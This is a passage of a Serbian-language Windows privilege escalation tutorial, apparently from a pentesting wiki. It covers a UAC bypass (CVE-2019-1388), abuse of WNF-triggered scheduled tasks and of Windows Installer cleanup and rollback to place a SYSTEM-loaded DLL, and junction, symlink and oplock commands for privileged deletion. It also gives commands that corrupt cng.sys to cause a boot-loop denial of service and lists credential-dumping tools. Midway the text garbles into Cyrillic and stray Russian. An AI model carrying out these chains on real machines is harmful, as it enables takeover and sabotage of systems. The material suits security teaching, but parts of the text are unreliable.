  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Krađa lozinki iz procesa

## Od korisnika sa niskim privilegijama do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ako imate pristup grafičkom interfejsu (putem konzole ili RDP-a), a UAC je omogućen, u nekim verzijama sistema Microsoft Windows moguće je pokrenuti terminal ili bilo koji drugi proces kao „NT\AUTHORITY SYSTEM“ iz neprivilegovanog korisničkog naloga.

To omogućava eskalaciju privilegija i istovremeno zaobilaženje UAC-a pomoću iste ranjivosti. Pored toga, nema potrebe ništa instalirati, a binarnu datoteku koja se koristi tokom postupka potpisao je i izdao Microsoft.

Neki od pogođenih sistema su:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Da biste iskoristili ovu ranjivost, potrebno je izvršiti sledeće korake:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od Administrator Medium do High Integrity Level / UAC Bypass

Pročitajte ovo da biste **naučili o nivoima integriteta**:


{{#ref}}
integrity-levels.md
{{#endref}}

Zatim **pročitajte ovo da biste naučili o UAC-u i UAC bypass-ima:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junction-i direktorijuma za otpremanje ka direktorijumu koji poslužuje web server

Aplikacija može da napravi predvidljiv poddirektorijum za otpremanje, upiše u njega naziv datoteke koji je zadao pozivalac, a zatim obradi datoteku. Ako korisnik sa niskim privilegijama može da ukloni i zameni taj poddirektorijum NTFS junction-om pre upisa sa strane servera, upis može da prati junction do direktorijuma koji poslužuje web server. Skripta postavljena tamo može da se izvršava pod identitetom web servisa ako server izvršava tu vrstu datoteke. Ovo je granica proizvoljnog upisa specifična za aplikaciju; direktorijum za otpremanje sa dozvolom za upis ili postojeći junction sami po sebi nisu dokaz.

Proverite tačno formiranje putanje i vremenski raspored u rukovaocu otpremanjem, efektivne dozvole korisnika za brisanje i kreiranje poddirektorijuma, efektivne ACL-ove odredišta, da li proces upisivanja prati reparse points i da li web server izvršava datoteke u tom odredištu. Zasebno potvrdite identitete procesa koji upisuje i web servera. Pasivni popis može da prikaže ACL-ove direktorijuma i metapodatke reparse tačaka, ali ne može da utvrdi ponašanje rukovaoca niti da li će doći do buduće zamene junction-a. Ako se izvršavanje odvija pod nalogom servisnog računa, pregledajte **stvarni token procesa** pre razmatranja zasebne putanje za eskalaciju privilegija putem tokena.

## Čišćenje privilegovanog zakazanog zadatka pokrenuto WNF-om

Zakazani zadatak koji odbija ručno pokretanje i dalje može da izloži okidač dostupan neprivilegovanom korisniku. Pri proveri privilegovanog zadatka, izvezite njegov XML i pregledajte **sve** okidače, kao i DACL zadatka, principal i akciju. Konkretno, `WnfStateChangeTrigger` navodi stanje Windows Notification Facility (WNF); ako to stanje, koje podržava securable objekat, dozvoljava trenutnom korisniku da objavi ažuriranje, korisnik može posredno da pokrene zadatak pod njegovim konfigurisanim identitetom uprkos `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Na primer, zadatak Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` radio je kao SYSTEM, prihvatao ažuriranja WNF stanja `7508BCA32C079E41` od standardnog korisnika, a zatim pregledao `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` čak i kada je Recall bio onemogućen.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Da biste testirali dostupnost, razrešite `ZwUpdateWnfStateData` iz `ntdll.dll`, pošaljite prazno ažuriranje za osmobajtni naziv stanja i uporedite status povratne vrednosti sa podacima o poslednjem pokretanju zadatka ili aktivnošću u Procmon-u. Sledeća skraćena proba koristi niz bajtova iz primera zadatka Recall; zamenite ga bajtovima izvezenim za zadatak koji testirate.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Pretvaranje rekurzivnog čišćenja u privilegovano brisanje

Korisna primitiva nije samo trigger, već privilegovana rutina za čišćenje koja prihvata direktorijum pod kontrolom napadača. Pratite operaciju od enumeracije do konačne izmene: otkrivanje profila/sesija, deca izabrana pomoću džoker znakova, `SHCreateItemFromParsingName` i `IFileOperation::DeleteItem` snažni su pokazatelji da će se ranije proverena putanja kasnije rekurzivno obrađivati. Ako se potomci ne otvaraju relativno u odnosu na pouzdane handles direktorijuma i ne proveravaju pre brisanja, napadač može da promeni razrešavanje putanje između enumeracije i upotrebe.<sup>[[43]](#references)</sup>

Uparite WNF trigger sa [oplock, junction i Object Manager symlink zamenom](#from-folder-contents-delete-to-system-eop) opisanom ispod: oplock pauzira alat za čišćenje nakon što izabere legitimno dete, dok se upisivi predak zamenjuje tako da se nakon nastavka privilegovano brisanje razreši kroz `\RPC Control` do zaštićene mete. U Recall lancu, ovo je omogućilo SYSTEM brisanje `C:\Config.Msi`, neophodno za dokumentovanu MSI rollback tehniku.<sup>[[31]](#references)[[43]](#references)</sup>

### Ugnježdeni potomci zaobilaze površne ispravke reparse point-a

Provera samo korena pod kontrolom napadača i njegovog neposrednog deteta ne obezbeđuje rekurzivno brisanje zasnovano na putanama. Ostavite te proverene objekte legitimnim i premestite junction/oplock zamenu u dodatno dete ispod njih; `IFileOperation::DeleteItem` će na kraju stići do neproverenog potomka i pratiti njegovu novu metu. CVE-2026-20941 nastao je upravo zbog ove vrste nepotpune ispravke: prva Recall zakrpa proveravala je `UKP` i direktorijum u obliku GUID-a, ali je zadržala staru rekurzivnu operaciju brisanja.<sup>[[43]](#references)</sup>

Bezbedan obrazac je da se **svaki potomak** otvori relativno u odnosu na već pouzdan handle direktorijuma, pribavi i proveri konačna razrešena putanja/objekat i primeni oznaka za brisanje na taj provereni handle. Nemojte proveravati prefiks, a zatim se vratiti na rekurzivno brisanje zasnovano na putanama. Prilikom pregleda zakrpe proverite i strukture na stvarnom mestu poziva: u ovom slučaju, analiza izvršavanja `OBJECT_ATTRIBUTES` pri `NtCreateFile` pokazala je nenulti `RootDirectory` i relativno ime `{GUID}\\secure_file.lock`, čime je opovrgnut obmanjujući izlaz dekompilatora koji je ukazivao na drugu primitivu `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Od proizvoljnog brisanja/pomeranja/preimenovanja fascikle do SYSTEM EoP

Tehnika opisana [**u ovom blog postu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), uz exploit kod [**dostupan ovde**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Napad se u osnovi sastoji od zloupotrebe Windows Installer rollback funkcije radi zamene legitimnih datoteka zlonamernim tokom procesa deinstalacije. Za to napadač treba da napravi **zlonamerni MSI installer** koji će se koristiti za otmicu fascikle `C:\Config.Msi`. Windows Installer će kasnije koristiti tu fasciklu za čuvanje rollback datoteka tokom deinstalacije drugih MSI paketa, pri čemu bi rollback datoteke bile izmenjene tako da sadrže zlonamerni payload.

### Ubacivanje putanje za čišćenje Windows Installer COM-a (CVE-2025-27727)

Klijent sa niskim privilegijama može da pristupi SYSTEM `msiexec.exe` servisu preko COM objekta `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Reverznim inženjeringom utvrđeno je da su relevantni `IMsiServer` pozivi `MsiBeginTransactionW` na vtable offset-u `0xA0`, `SetEEUIDirectoryAndFilter` na `0xC8` i `CleanupTempPackages` na `0x50`. Ovi nazivi i offset-i dobijeni su reverznim inženjeringom i mogu da se razlikuju između verzija.<sup>[[41]](#references)</sup>

Za korisnika koji nije administrator, `SetEEUIDirectoryAndFilter` impersonira pozivaoca samo tokom otvaranja prosleđene putanje sa `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` i `FILE_FLAG_OPEN_REPARSE_POINT`. Time se potvrđuje da pozivalac može da obriše direktorijum i sprečava praćenje reparse point-a, ali se **ne** vezuje provereni fajl objekat za kasnije čišćenje niti dokazuje da ga je kreirao Windows Installer.<sup>[[41]](#references)</sup>

Nakon `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` zakazuje putanju kao fasciklu bez obzira na argument filtera koji je prosledio pozivalac. Servis upisuje imenovanu vrednost `REG_DWORD` pod `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: naziv vrednosti je putanja pod kontrolom pozivaoca, a podaci `0x00000002` predstavljaju oznaku fascikle. `CleanupTempPackages(NULL, FALSE)` zatim direktno pokreće čišćenje. Njegov worker sa povišenim privilegijama enumeriše vrednosti registra i prosleđuje stavke fascikli rekurzivnoj funkciji `FDeleteFolder`, bez provere porekla putanje. Ako uobičajeno uklanjanje ne uspe, kod takođe poziva `LockdownPath`, uklanja atribute datoteke i pokušava ponovo.<sup>[[41]](#references)</sup>

Minimalni redosled poziva rekonstruisan iz `msi.dll` je:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Korisni primitiv je ponovna upotreba putanje, a ne preusmeravanje junction-om. Registrujte `C:\Config.Msi` koji je kreirao napadač, uklonite ga i sačekajte da Windows Installer kasnije ponovo kreira istu putanju sa zaštićenim rollback podacima. Čišćenje veruje zastarelom nazivu `TempPackages` i briše novi direktorijum kao SYSTEM. Time se zaobilazi predviđena zaštita koju pružaju `FILE_FLAG_OPEN_REPARSE_POINT` i ublažavanje rizika zasnovano na poverenju u preusmeravanje, jer reparse point nije potreban.<sup>[[41]](#references)</sup>

Ovaj primitiv za brisanje uklapa se u rollback lanac ispod: sačuvajte zaseban zapis `Installer\Folders`, obrišite zaštićeni `C:\Config.Msi`, ponovo ga kreirajte sa NULL DACL-om i zadržite handle kojem je dodeljen `WRITE_DAC` pre nego što installer učvrsti DACL. Prethodno otvoreni handle može da vrati permisivni DACL pomoću `NtSetSecurityObject`, nakon čega se generisani `.rbs` može zameniti pre nastavka rollback-a.<sup>[[41]](#references)</sup>

Microsoft je ispravio putanju tako što je sprečio `CMsiTransaction::SetEEUIDirectoryAndFilter` da poziva `ScheduleFileOrFolderDelete` kada je omogućena nova kontrola funkcije. COM poziv i dalje može da vrati uspeh, ali više ne dodaje putanju koju kontroliše napadač в `TempPackages`. Primenite bezbednosne ispravke za Windows iz aprila 2025. umesto da успешан повратак метода користите као проверу закрпе.<sup>[[41]](#references)[[42]](#references)</sup>

Sažeta tehnika izgleda ovako:

1. **Faza 1 – Priprema otmice (ostavite `C:\Config.Msi` praznim)**

- Korak 1: Instalirajte MSI
    - Napravite `.msi` koji instalira bezopasnu datoteku (npr. `dummy.txt`) u direktorijum u koji može da se upisuje (`TARGETDIR`).
    - Označite installer kao **„UAC Compliant“**, kako bi mogao da ga pokrene **korisnik koji nije administrator**.
    - Ostavite otvoren **handle** ka datoteci nakon instalacije.

- Korak 2: Započnite deinstalaciju
    - Deinstalirajte isti `.msi`.
    - Proces deinstalacije počinje da premešta datoteke u `C:\Config.Msi` i preimenuje ih u `.rbf` datoteke (rollback rezervne kopije).
    - **Periodično proveravajte otvoreni handle** pomoću `GetFinalPathNameByHandle` da biste otkrili kada datoteka postane `C:\Config.Msi\<random>.rbf`.

- Korak 3: Prilagođena sinhronizacija
    - `.msi` sadrži **prilagođenu akciju deinstalacije (`SyncOnRbfWritten`)** koja:
        - Signalizira kada je `.rbf` upisan.
        - Zatim **čeka** na drugi događaj pre nego što nastavi deinstalaciju.

- Korak 4: Sprečite brisanje `.rbf` datoteke
    - Kada dobijete signal, **otvorite `.rbf` datoteku** bez `FILE_SHARE_DELETE` — time se **sprečava njeno brisanje**.
    - Zatim **pošaljite signal nazad** kako bi deinstalacija mogla da se završi.
    - Windows Installer ne uspeva da obriše `.rbf`, a pošto ne može da obriše sav sadržaj, **`C:\Config.Msi` se ne uklanja**.

- Korak 5: Ručno obrišite `.rbf`
    - Vi, kao napadač, ručno obrišite `.rbf` datoteku.
    - Sada je **`C:\Config.Msi` prazan**, spreman za otmicu.

> U ovom trenutku **pokrenite ranjivost za proizvoljno brisanje direktorijuma na nivou SYSTEM** da biste obrisali `C:\Config.Msi`.

2. **Faza 2 – Zamena rollback skripti zlonamernim skriptama**

- Korak 6: Ponovo kreirajte `C:\Config.Msi` sa slabim ACL-ovima
    - Sami ponovo kreirajte direktorijum `C:\Config.Msi`.
    - Postavite **slabe DACL-ove** (npr. Everyone:F) i **ostavite otvoren handle** sa pravom `WRITE_DAC`.

- Korak 7: Pokrenite novu instalaciju
    - Ponovo instalirajte `.msi`, uz:
        - `TARGETDIR`: lokacija u koju može da se upisuje.
        - `ERROROUT`: promenljiva koja izaziva prisilni neuspeh.
    - Ova instalacija će se koristiti za ponovno pokretanje **rollback-а**, который читает `.rbs` и `.rbf`.

- Korak 8: Надгледајте појаву `.rbs`
    - Користите `ReadDirectoryChangesW` за надгледање `C:\Config.Msi` док се не појави нови `.rbs`.
    - Забележите његово име.

- Korak 9: Синхронизујте пре rollback-а
    - `.msi` садржи **прилагођену акцију инсталације (`SyncBeforeRollback`)** која:
        - Сигнализира догађај када се креира `.rbs`.
        - Затим **чека** пре него што настави.

- Korak 10: Поново примените слабе ACL-ове
    - Након пријема догађаја `.rbs created`:
        - Windows Installer **поново примењује јаке ACL-ове** на `C:\Config.Msi`.
        - Али пошто и даље имате handle са правом `WRITE_DAC`, можете **поново да примените слабе ACL-ове**.

> ACL-ови се **проверавају само при отварању handle-а**, тако да и даље можете да уписујете у директоријум.

- Korak 11: Поставите лажне `.rbs` и `.rbf` датотеке
    - Препишите `.rbs` датотеку **лажном rollback скриптом** која налаже Windows-у да:
        - Врати вашу `.rbf` датотеку (злонамерни DLL) на **привилеговану локацију** (нпр. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Поставите лажну `.rbf` датотеку која садржи **злонамерни DLL payload на нивоу SYSTEM**.

- Korak 12: Покрените rollback
    - Пошаљите сигнал за синхронизацију како би installer наставио.
    - **Прилагођена акција типа 19 (`ErrorOut`)** подешена је тако да **намерно изазове неуспех инсталације** у познатој тачки.
    - То покреће **rollback**.

- Korak 13: SYSTEM инсталира ваш DLL
    - Windows Installer:
        - Чита ваш злонамерни `.rbs`.
        - Копира ваш `.rbf` DLL на циљну локацију.
    - Сада се ваш **злонамерни DLL налази на путањи коју учитава SYSTEM**.

- Завршни корак: Извршите SYSTEM код
    - Покрените поуздани **auto-elevated бинарни фајл** (нпр. `osk.exe`) који учитава DLL који сте отели.
    - **Бум**: ваш код се извршава **као SYSTEM**.


### Од произвољног брисања/премештања/преименовања датотека до SYSTEM EoP

Главна MSI rollback техника (претходна) претпоставља да можете да обришете **цео директоријум** (нпр. `C:\Config.Msi`). Али шта ако ваша рањивост омогућава само **произвољно брисање датотека**?

Можете да искористите **NTFS интерне механизме**: сваки директоријум има скривени alternate data stream који се зове:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ovaj stream čuva **metapodatke indeksa** fascikle.

Dakle, ako **obrišete stream `::$INDEX_ALLOCATION`** fascikle, NTFS **uklanja celu fasciklu** iz sistema datoteka.

To možete uraditi koristeći standardne API-je za brisanje datoteka, kao što su:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Iako pozivate API za brisanje *fajla*, on **briše samu fasciklu**.

### Od brisanja sadržaja fascikle do SYSTEM EoP
Šta ako vam primitiva ne dozvoljava da brišete proizvoljne fajlove/fascikle, ali vam **dozvoljava da brišete *sadržaj* fascikle koju kontroliše napadač**?

1. Korak 1: Podesite mamac-fasciklu i fajl
- Kreirajte: `C:\temp\folder1`
- Unutar nje: `C:\temp\folder1\file1.txt`

2. Korak 2: Postavite **oplock** na `file1.txt`
- Oplock **pauzira izvršavanje** kada privilegovani proces pokuša da obriše `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Korak 3: Pokrenite SYSTEM proces (npr., `SilentCleanup`)
- Ovaj proces skenira fascikle (npr., `%TEMP%`) i pokušava da obriše njihov sadržaj.
- Kada naiđe na `file1.txt`, **oplock se aktivira** i predaje kontrolu vašem callback-u.

4. Korak 4: Unutar oplock callback-a – preusmerite brisanje

- Opcija A: Premestite `file1.txt` na drugo mesto
    - Ovo prazni `folder1` bez prekidanja oplock-a.
    - Nemojte direktno da obrišete `file1.txt` — time biste prerano oslobodili oplock.

- Opcija B: Pretvorite `folder1` u **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opcija C: Napravite **symlink** u `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Ovo cilja interni NTFS stream koji čuva metapodatke foldera — brisanjem se briše folder.

5. Korak 5: Oslobodite oplock
- SYSTEM proces nastavlja rad i pokušava da obriše `file1.txt`.
- Ali sada, zbog junction + symlink, zapravo briše:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Rezultat**: `C:\Config.Msi` briše SYSTEM.

### Od kreiranja proizvoljne fascikle do trajnog DoS-a

Iskoristite primitiv koji vam omogućava da **kreirate proizvoljnu fasciklu kao SYSTEM/admin** — čak i ako **ne možete da upisujete datoteke** ili **postavljate slabe dozvole**.

Kreirajte **fasciklu** (ne datoteku) sa imenom **kritičnog Windows drajvera**, npr.:
```
C:\Windows\System32\cng.sys
```

- Ova putanja obično odgovara kernel-mode drajveru `cng.sys`.
- Ako je **unapred kreirate kao fasciklu**, Windows neće uspeti da učita stvarni drajver pri pokretanju sistema.
- Zatim Windows pokušava da učita `cng.sys` tokom pokretanja sistema.
- Nailazi na fasciklu, **ne uspeva da pronađe stvarni drajver** i **ruši sistem ili zaustavlja pokretanje**.
- **Nema rezervne opcije** ni **oporavka** bez spoljne intervencije (npr. popravke pokretanja sistema ili pristupa disku).

### Od privilegovanih putanja za logove/rezervne kopije i OM symlinks do proizvoljnog prepisivanja datoteka / boot DoS-a

Kada **privilegovana usluga** upisuje logove/izvoze na putanju pročitanu iz **konfiguracije u koju napadač može da upisuje**, preusmerite tu putanju pomoću **Object Manager symlinks + NTFS mount points** da biste privilegovani upis pretvorili u proizvoljno prepisivanje (čak i **bez SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Zahtevi**
- Napadač može da menja konfiguraciju koja sadrži ciljnu putanju (npr. `%ProgramData%\...\.ini`).
- Mogućnost kreiranja mount point-a ka `\RPC Control` i OM file symlink-a (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Privilegovana operacija koja upisuje na tu putanju (log, izvoz, izveštaj).

**Primer lanca**
1. Pročitajte konfiguraciju da biste saznali privilegovano odredište loga, npr. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` u `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Preusmerite putanju bez administratorskih privilegija:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Sačekajte da privilegovana komponenta upiše log (npr. administrator pokrene „send test SMS“). Upis se sada obavlja u `C:\Windows\System32\cng.sys`.
4. Pregledajte prepisanu datoteku (hex/PE parserom) da biste potvrdili oštećenje; ponovno pokretanje primorava Windows da učita izmenjenu putanju drajvera → **boot loop DoS**. Ovo se može primeniti i na bilo koju zaštićenu datoteku koju će privilegovani servis otvoriti za upis.

> `cng.sys` se obično učitava iz `C:\Windows\System32\drivers\cng.sys`, ali ako postoji kopija u `C:\Windows\System32\cng.sys`, prvo može biti pokušan njen učitavanje, što je čini pouzdanim odredištem za DoS pomoću oštećenih podataka.



## **Od High Integrity do System**

### **Novi servis**

Ako već radite u procesu sa High Integrity nivoom, **put do SYSTEM** može biti jednostavan: samo **kreirajte i pokrenite novi servis**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Kada pravite servisni binarni fajl, proverite da li je validan servis ili da li binarni fajl dovoljno brzo izvršava potrebne radnje, jer će biti ugašen za 20 sekundi ako nije validan servis.

### AlwaysInstallElevated

Iz procesa sa visokim integritetom možete pokušati da **omogućite AlwaysInstallElevated unose u registru** i **instalirate** reverse shell pomoću _**.msi**_ omotača.\
[Više informacija o ključevima registra koji su uključeni i o tome kako da instalirate _.msi_ paket potražite ovde.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Kod možete** [**pronaći ovde**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ako imate te privilegije tokena (verovatno ćete ih pronaći u procesu koji već ima visok integritet), moći ćete da **otvorite skoro svaki proces** (osim zaštićenih procesa) pomoću privilegije SeDebug, **kopirate token** procesa i kreirate **proizvoljan proces sa tim tokenom**.\
Ova tehnika se obično koristi za **izbor bilo kog procesa koji se izvršava kao SYSTEM sa svim privilegijama tokena** (_da, možete pronaći SYSTEM procese koji nemaju sve privilegije tokena_).\
**Primer koda koji izvršava predloženu tehniku možete** [**pronaći ovde**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ovu tehniku koristi meterpreter za eskalaciju u `getsystem`. Tehnika se sastoji od **kreiranja pipe-a, a zatim kreiranja/zloupotrebe servisa za pisanje u taj pipe**. Zatim će **server** koji je kreirao pipe pomoću privilegije **`SeImpersonate`** moći da **impersonate-uje token** klijenta pipe-a (servisa) i dobije SYSTEM privilegije.\
Ako želite da [**saznate više o name pipes, pročitajte ovo**](#named-pipe-client-impersonation).\
Ako želite da pročitate primer [**prelaska sa visokog integriteta na System pomoću name pipes, pročitajte ovo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ako uspete da **hijack-ujete DLL** koji **učitava** **proces** pokrenut kao **SYSTEM**, moći ćete da izvršite proizvoljan kod sa tim dozvolama. Zato je Dll Hijacking koristan i za ovu vrstu eskalacije privilegija; štaviše, **mnogo ga je lakše izvesti iz procesa sa visokim integritetom**, jer će imati **dozvole za pisanje** u fasciklama koje se koriste za učitavanje DLL-ova.\
**Više o Dll hijacking-u možete** [**saznati ovde**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Pročitajte:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Najbolji alat za pronalaženje vektora lokalne eskalacije privilegija u Windows-u:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Proverava pogrešne konfiguracije i osetljive fajlove (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Otkriven.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Proverava neke moguće pogrešne konfiguracije i prikuplja informacije (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Proverava pogrešne konfiguracije**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Izvlači sačuvane informacije o sesijama za PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Koristite -Thorough u lokalnom okruženju.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Izvlači akreditive iz Credential Manager-a. Otkriven.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Isprobava prikupljene lozinke na domenu**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh je PowerShell ADIDNS/LLMNR/mDNS alat za spoofing i man-in-the-middle napade.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Osnovno Windows prikupljanje informacija za privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Traži poznate privesc ranjivosti (ZASTARELO, koristi se Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne provere **(potrebna su administratorska prava)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Traži poznate privesc ranjivosti (mora da se kompajlira pomoću VisualStudio-a) ([**prekompajliran**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Pretražuje host u potrazi za pogrešnim konfiguracijama (više alat za prikupljanje informacija nego za privesc) (mora da se kompajlira) **(**[**prekompajliran**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Izvlači akreditive iz velikog broja programa (prekompajlirani exe na github-u)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp-a na C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Proverava pogrešne konfiguracije (prekompajlirani izvršni fajl na github-u). Ne preporučuje se. Ne radi dobro u Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Proverava moguće pogrešne konfiguracije (exe iz python-a). Ne preporučuje se. Ne radi dobro u Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Alat napravljen na osnovu ovog posta (za ispravan rad mu nije potreban accesschk, ali može da ga koristi).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita izlaz komande **systeminfo** i preporučuje exploite koji rade (lokalni python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita izlaz komande **systeminfo** i preporučuje exploite koji rade (lokalni Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projekat morate da kompajlirate pomoću odgovarajuće verzije .NET-a ([pogledajte ovo](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Da biste videli instaliranu verziju .NET-a na hostu žrtve, možete da uradite sledeće:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Osnove eskalacije privilegija u Windows-u](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Eskalacija privilegija iskorišćavanjem slabih dozvola fascikli](http://www.greyhathacker.net/?p=738)
- [3] [Eskalacija privilegija u Windows-u – podsetnik](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Radionica za lokalnu eskalaciju privilegija u Windows-u / Linux-u](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows napadi: AT je nova crna (Rob Fuller i Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
